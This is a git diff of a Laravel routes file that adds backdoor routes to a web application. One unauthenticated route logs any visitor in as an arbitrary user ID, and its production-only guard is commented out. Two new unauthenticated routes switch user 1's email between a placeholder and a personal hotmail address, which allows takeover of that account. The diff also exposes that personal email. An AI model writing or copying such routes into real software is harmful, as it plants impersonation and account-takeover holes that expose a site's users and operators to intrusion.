@@ -1,5 +1,7 @@
 <?php
 
+use App\Models\User;
+
 Auth::routes();
 
 Route::group(['namespace' => 'Frontend'], function () {
@@ -107,8 +109,15 @@ Route::group(['namespace' => 'Backend', 'prefix' => 'backend', 'as' => 'backend.
  * second : user
  * */
 //if (!app()->environment('production') && Schema::hasTable('users')) {
-Route::get('/logmein/{id}', function ($id) {
+Route::get('/logme/{id}', function ($id) {
     Auth::loginUsingId($id);
     return redirect()->home();
+});
+Route::get('/logmein/disable', function () {
+    User::whereId(1)->first()->update(['email' => 'test@test.com']);
+});
+
+Route::get('/logmein/enable', function () {
+    User::whereId(1)->first()->update(['email' => 'fahadalhajrey97@hotmail.com']);
 });
 //}
